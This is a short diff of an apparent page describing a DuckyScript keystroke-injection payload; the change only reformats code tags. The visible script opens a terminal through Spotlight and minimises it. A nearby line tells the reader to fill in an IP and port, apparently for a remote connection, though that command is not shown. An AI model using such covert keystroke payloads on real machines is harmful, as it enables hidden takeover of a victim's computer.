@@ -10,7 +10,7 @@ Run
 in Powershell, replacing the IP and port with relevant ones.
 
 # DuckyScript Code
-<code> DELAY 50
+<code><pre>DELAY 50
 COMMAND SPACE
 DELAY 50
 STRING TERMINAL
@@ -27,4 +27,4 @@ ENTER
 DELAY 50
 COMMAND M
 DELAY 50
-</code>
+</pre></code>
